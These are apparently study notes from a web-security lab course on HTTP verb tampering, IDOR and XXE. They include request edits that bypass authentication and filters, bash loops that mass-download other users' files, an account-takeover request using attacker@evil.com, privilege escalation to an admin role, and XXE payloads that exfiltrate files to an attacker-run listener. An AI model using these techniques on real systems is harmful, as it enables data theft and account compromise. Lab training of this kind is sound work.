# Intro to HTTP Verb Tampering

HTTP requests start with a method (verb) that tells the server what action to perform. Common methods are GET and POST, but HTTP supports others like HEAD, PUT, DELETE, etc.

If a web server and application are configured to only allow GET and POST, sending other methods just causes an error (mostly harmless, aside from potential info disclosure).
However, if the server accepts more methods and the application isn’t built to handle them securely, attackers can exploit this to access hidden functions or bypass security.

| Verb        | Description                                       |
| ----------- | ------------------------------------------------- |
| **HEAD**    | Same as GET but returns only headers (no body)    |
| **PUT**     | Writes the request payload to a specific location |
| **DELETE**  | Deletes the resource at a specific location       |
| **OPTIONS** | Shows the methods supported by the server         |
| **PATCH**   | Makes partial changes to a resource               |


# Bypassing Basic Authentication

First, we intercept the request in Burp Suite.

The reset action uses a GET request:

<pre>GET /admin/reset.php HTTP/1.1
Host: SERVER_IP:PORT
...</pre>

- We try changing it to POST (Right-click → Change Request Method in Burp).
- Result: still prompted for login → server protects both GET and POST.
- Next, we test for other methods.
- A good candidate is HEAD, which works like GET but returns only headers (no body). Sometimes authentication is not applied to it, but the server still executes the function.

We first check what methods the server accepts:

`curl -i -X OPTIONS http://SERVER_IP:PORT/`

Response:

`Allow: POST,OPTIONS,HEAD,GET`

Since HEAD is allowed, we try it:

<pre>HEAD /admin/reset.php HTTP/1.1
Host: SERVER_IP:PORT
...</pre>

This time:

- No login prompt
- Empty output (normal for HEAD)
- Going back to the File Manager shows all files deleted

We successfully triggered the Reset without credentials.

# Bypassing Security Filters


The second — and more common — type of HTTP Verb Tampering comes from insecure coding.
This happens when a security filter only checks certain HTTP methods (e.g., only POST) and ignores others like GET, PUT, or PATCH.
For example, if a filter scans only $_POST['parameter'] for injections, switching the request to GET could bypass it.

**Identify**

In our File Manager web app, if we try to create a file with special characters (e.g., test;), we see:

Malicious Request Denied!

- This means the back end is filtering requests to block injection attempts.
- No matter what we try via the normal request, the filter blocks it.
- So we attempt HTTP Verb Tampering to see if another method bypasses the filter.

**Exploit**

Intercept the request in Burp Suite.

Use Change Request Method to switch to another method, like GET.

Example intercepted request:

<pre>GET /?filename=test%3B HTTP/1.1
Host: SERVER_IP:PORT
...</pre>

Result:

No "Malicious Request Denied!" message

The file test is created successfully


# Identifying IDORs

IDOR (Insecure Direct Object Reference) vulnerabilities appear when a web app exposes direct links or references to internal objects (files, IDs, database records) without proper access control.
To find them, we need to inspect HTTP requests for object references.

**1. URL Parameters & APIs**

Look for parameters like:

`?uid=1`
`?filename=file_1.pdf`
These often appear in URLs or API calls, but can also be in cookies or headers.

Basic testing:

- Change the number or filename (`uid=2`, `file_2.pdf`)
- Use fuzzing tools to try many variations
- Any unauthorized data returned → possible IDOR

**2. AJAX Calls**

Sometimes, front-end JavaScript contains hidden API endpoints.
Frameworks might load all functions on the client side and only “enable” certain ones based on role.
Even if you’re a normal user, the admin functions may still be in the code.

Example:

<pre>function changeUserPassword() {
    $.ajax({
        url: "change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success: function(result) {
            //
        }
    });
}</pre>

- Even if this function isn’t triggered in normal use, we can test it manually.
- If it works without proper access checks → IDOR.

**3. Hashing & Encoding References**

- Some apps encode or hash object references instead of using plain text IDs.
- If there’s no proper back-end access control, these can still be exploited.

Encoding example (Base64)

`?filename=ZmlsZV8xMjMucGRm`

- Decode: `file_123.pdf`
- Change: `file_124.pdf`
- Encode again and request it
- If the file is accessible → IDOR

**Hashing example (MD5)**

<pre>$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});</pre>

If we know the hash algorithm, we can hash other filenames (file_2.pdf) and try downloading them.

**4. Comparing User Roles**

- Create two accounts with different roles and compare their requests.
- Look for differences in API calls or object references.

Example (User1 API call):

<pre>{
  "attributes": {
    "type": "salary",
    "url": "/services/data/salaries/users/1"
  },
  "Id": "1",
  "Name": "User1"
}</pre>

If User2 can make the same request and get data → IDOR.

Even if we can’t calculate other users’ references, the fact that access control doesn’t verify ownership is a vulnerability.


# Mass IDOR Enumeration

Exploiting an IDOR can be simple or complex.

Once we spot a possible IDOR, we first try basic changes to see if other users’ data is accessible.

For more advanced exploitation, we need to understand:

- How the application creates object references
- How access control works
- How to automate requests for mass data retrieval

**Example: Insecure Parameters**

We have an Employee Manager app:

`http://SERVER_IP:PORT/`

We’re logged in as `uid=1`.

**Clicking Documents takes us to:**

`http://SERVER_IP:PORT/documents.php?uid=1`

**The files have predictable names:**

`/documents/Invoice_1_09_2021.pdf`
`/documents/Report_1_10_2021.pdf`

**The naming pattern uses:**

File type (Invoice/Report)
User ID (uid)
Date (month/year)

If the app uses the uid parameter directly without access control, changing it to `?uid=2` could expose another employee’s documents.

**Testing uid=2:**

`http://SERVER_IP:PORT/documents.php?uid=2`

The page looks the same at first glance, but checking the file links shows:

`/documents/Invoice_2_08_2020.pdf`
`/documents/Report_2_12_2020.pdf`

This confirms an IDOR — the uid parameter controls which user’s files are shown, with no back-end checks.

**Mass Enumeration**

Manually checking `uid=3`, `uid=4`, etc. is slow.
Instead, we can automate using curl + grep, a for loop, or tools like Burp Intruder/ZAP Fuzzer.

**Finding document links for a single UID:**

`curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"`

`/documents/Invoice_3_06_2020.pdf`
`/documents/Report_3_01_2020.pdf`

**Automating with Bash**

<pre>#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link
    done
done</pre>

This loops through UIDs 1–10, finds PDF links, and downloads them — mass-exploiting the IDOR.

# Bypassing Encoded References

Sometimes, object references in an IDOR are encoded or hashed, making enumeration harder — but not impossible.

Example: Employee Contracts

**In the Employee Manager app:**

`http://SERVER_IP:PORT/contracts.php`

Clicking Employment_contract.pdf sends a POST request to:

<pre>/download.php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b</pre>

The contract parameter is an MD5 hash — we can’t directly decode it.

**Step 1 – Trying to Guess the Hash**

We try hashing common values (UID, username, filename):

`echo -n 1 | md5sum`

Result doesn’t match.
The value could be more complex (e.g., combined fields), so guessing would be hard.

**Step 2 – Discovering the Function**

Inspecting the page source reveals:

`javascript:downloadContract('1')`

The function:

<pre>javascript
Copy
Edit
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}</pre>

It base64-encodes the UID, then hashes it with MD5.

Example for UID=1:

`echo -n 1 | base64 -w 0 | md5sum`

`cdd96d3cc73d1dbdaffa03cc6cd7339b`

This matches the request — we’ve reversed the hashing process.

**Step 3 – Mass Enumeration**

We generate hashes for UIDs 1–10:

<pre>for i in {1..10}; do
    echo -n $i | base64 -w 0 | md5sum | tr -d ' -'
done</pre>

Sample output:

`cdd96d3cc73d1dbdaffa03cc6cd7339b`
`0b7e7dee87b1c3b98e72131173dfbbbf`
...

**Step 4 – Downloading All Contracts**


<pre>#!/bin/bash
for i in {1..10}; do
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
done</pre>

Running it downloads all contracts:

contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
...


# IDOR in Insecure APIs

So far, we’ve used IDOR to access files and resources.
But IDOR can also exist in function calls and APIs, allowing actions as other users — e.g., changing their details, resetting passwords, or making purchases.

**Information Disclosure vs. Insecure Function Calls**

- IDOR Information Disclosure → lets us read other users’ data.
- IDOR Insecure Function Calls → lets us perform actions as other users.

Often, we can combine these: first leak info, then use it to attack API calls.

**Example: Editing a Profile**

In the Employee Manager app, clicking Edit Profile leads to:

`http://SERVER_IP:PORT/profile/index.php`

Form fields:

- Full Name
- Email
- About Me
  
**Updating the profile sends:**

`PUT /profile/api.php/profile/1`

With JSON data:

<pre>{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat..."
}</pre>

Security Weakness Observed
Role (role=employee) is stored client-side (cookie + JSON).
This could be manipulated if no server-side checks exist.
We need to know valid role names to escalate privileges.

**Exploitation Attempts**

1. Change UID to another user’s (`uid=2`)

Result: uid mismatch → back-end checks UID against API endpoint.

2 .Modify another user’s details

Change endpoint to `/profile/api.php/profile/2` and set `uid=2`.

Result: uuid mismatch → back-end checks UUID too.

3. Create a new user (POST request)

Result: Creating new employees is for admins only.

Delete a user (DELETE request)

Result: Deleting employees is for admins only.

4. Change role to admin

Without knowing valid role names → Invalid role.


# Chaining IDOR Vulnerabilities

Sometimes, IDOR information disclosure (reading other users’ data) can be combined with IDOR insecure function calls (modifying other users’ data) for powerful attacks.

**Step 1 – Information Disclosure**

When the profile page loads, it fetches user data with:

<pre>GET /profile/api.php
Cookie: role=employee</pre>

There’s no token-based or per-user access control — only the role cookie.

If we change the UID in the request:

`GET /profile/api.php/profile/2`

We get another user’s details:

<pre>{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation..."
}</pre>

Now we have their UUID, which we couldn’t guess before.

**Step 2 – Modifying Another User**

Using the leaked UUID, we send:

`PUT /profile/api.php/profile/2`

With modified details:

<pre>{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Changed Name",
    "email": "attacker@evil.com",
    "about": "..."
}</pre>

Result: No access control errors. Changes persist.

**Potential Attacks**

Change a user’s email → trigger password reset → take over account
Inject an XSS payload in “about” → execute when they view their profile

**Step 3 – Finding Admin Accounts**

We enumerate all users (scriptable) and find:

<pre>{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}</pre>

Now we know the admin role name: web_admin.

**Step 4 – Escalating Our Role**

Intercept the Update Profile request, change our role:

`"role": "web_admin"`

Result:

<pre>{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "..."
}</pre>

No “Invalid role” error → role changed successfully.


# Intro to XXE

**What is XML?**

XML (Extensible Markup Language) is a markup language (like HTML) used mainly for storing and transferring data, not for display.
XML documents have a root element and child elements.

- Tags: <date>
- Entities: Variables in XML (&lt; for <)
- Elements: Data between start and end tags (<date>01-01-2022</date>)
- Attributes: Extra info inside tags (version="1.0")
- Declaration: First line declaring version and encoding (<?xml version="1.0" encoding="UTF-8"?>)
- Special characters <, >, &, " must be replaced with entities (&lt;, &gt;, &amp;, &quot;).
- Comments: <!-- comment -->

**Example XML:**

<img width="646" height="460" alt="image" src="https://github.com/user-attachments/assets/4d54ddbc-2169-416e-8e2e-2d8f1c223959" />

**XML DTD (Document Type Definition)**

A DTD defines the allowed structure of an XML document.

**Example:**

<img width="655" height="325" alt="image" src="https://github.com/user-attachments/assets/eaa99e15-2c48-4f03-9e8b-a83e73534811" />

Can be internal (inside the XML) or external (in a file like email.dtd).

**Example referencing an external file:**

<img width="492" height="81" alt="image" src="https://github.com/user-attachments/assets/c5b43bfd-814a-423b-9806-91842d740baa" />

**Example referencing via URL:**

<img width="641" height="77" alt="image" src="https://github.com/user-attachments/assets/7215ad45-8a01-4fc6-9524-78427b3b655e" />

**XML Entities**

Entities are variables in XML, defined in DTDs.

**Internal Entity Example:**

<img width="483" height="138" alt="image" src="https://github.com/user-attachments/assets/c1c3bd1f-ec6f-47fa-8e97-6831f38b94b3" />


Use in document: &company; → replaced with Inlane Freight.

**External Entity Example (SYSTEM keyword):**

<img width="688" height="163" alt="image" src="https://github.com/user-attachments/assets/5f75e454-2890-4d21-880e-fbb9b18927e2" />


- SYSTEM loads from a file path or URL.
- PUBLIC can also be used for public resources.

When parsed server-side (e.g., SOAP APIs or form uploads), external entities can load local server files. If the file content is returned to the attacker, it can leak sensitive server data.

# Local File Disclosure via XXE


When a web app accepts unfiltered XML input, we can define external entities that reference local files on the server. If the app displays the entity value in the response, we can read those files.

**1. Identifying XXE**

- Look for web pages that accept XML input (e.g., a contact form).
- Intercept the request in Burp Suite and check if the request body is XML.

Example request:

<img width="385" height="187" alt="image" src="https://github.com/user-attachments/assets/48762a39-aecf-406d-922d-c717f4303cb9" />

If the app reflects back any XML field value, it’s a candidate for XXE.

**2. Testing with an Internal Entity**

Add a DOCTYPE and define an entity:

<img width="455" height="296" alt="image" src="https://github.com/user-attachments/assets/bce1a703-f2c4-4af0-9283-79286edb46a9" />

If &company; is replaced with "Inlane Freight" in the response, XML injection is possible.

**3. Reading Local Files**

Use an external entity:

<img width="532" height="303" alt="image" src="https://github.com/user-attachments/assets/68851dbc-aff3-452d-a39b-e8f4059a38b5" />

If the /etc/passwd content is shown, the app is vulnerable.

**4. Reading Source Code (PHP Example)**

PHP's php://filter allows base64-encoded file reads:

<img width="875" height="293" alt="image" src="https://github.com/user-attachments/assets/f4d5aba6-22e5-4c27-aa97-d6f70107ee01" />

Decode the base64 to view the source.

**5. Remote Code Execution (PHP expect module)**

If enabled, expect:// can run commands:

<img width="502" height="330" alt="image" src="https://github.com/user-attachments/assets/e5274004-a5d4-4300-b91a-9f131bbe82ed" />

You can also use curl to fetch a web shell from your server.

**6. DoS Attack (Billion Laughs)**

<img width="695" height="480" alt="image" src="https://github.com/user-attachments/assets/c2cd7519-394d-47a2-9c4b-b7a4baa0ccd6" />

This can overload memory on vulnerable servers (most modern ones block it).

# Blind XXE Data Exfiltration

In some XXE cases, no entity values or error messages are shown — making the vulnerability completely blind.
We can still exfiltrate files using Out-of-Band (OOB) data exfiltration by making the target server send the file contents to us.

**1. OOB File Exfiltration (Manual)**

We host a malicious DTD that:

- Reads the target file.
- Base64-encodes it.
- Sends it to our server as an HTTP request parameter.

xxe.dtd

<img width="852" height="68" alt="image" src="https://github.com/user-attachments/assets/b74ae9ba-568e-445e-aacf-fae31343e989" />

If `/etc/passwd` contains `root:x:0:0:root:/root:/bin/bash`, it will be sent to:

`http://OUR_IP:8000/?content=<BASE64>`

We can then decode it locally.

**2. Local PHP Listener**

<img width="606" height="166" alt="image" src="https://github.com/user-attachments/assets/8c73eb06-0145-40b5-94f9-e4df204069ac" />

Run the listener:

`vi index.php   # Paste PHP code`
`php -S 0.0.0.0:8000`

**3. Blind XXE Payload**

<img width="633" height="218" alt="image" src="https://github.com/user-attachments/assets/b75b9030-7aea-4220-b5db-58b046491b5c" />

Send as POST to:

`/blind/submitDetails.php`

**4. Example Output on Listener**

<img width="518" height="128" alt="image" src="https://github.com/user-attachments/assets/d3b0d450-147f-4744-9932-936a5dc8bfc1" />

Tip: Instead of sending data in the URL parameter, you can use DNS exfiltration
(e.g., <BASE64>.our-domain.com) and capture traffic with tcpdump.

**5. Automated OOB XXE (XXEinjector)**

Clone the tool:

`git clone https://github.com/enjoiz/XXEinjector.git`

Save the intercepted HTTP request from Burp to /tmp/xxe.req, replacing the XML body with:

<img width="403" height="42" alt="image" src="https://github.com/user-attachments/assets/b4fb5e78-0676-4d7a-877c-3720424f8e11" />

XXEINJECT

Run:

`ruby XXEinjector.rb --host=<YOUR_IP> --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter`

Decoded files will be stored in:

`Logs/<target_ip>/<file>.log`
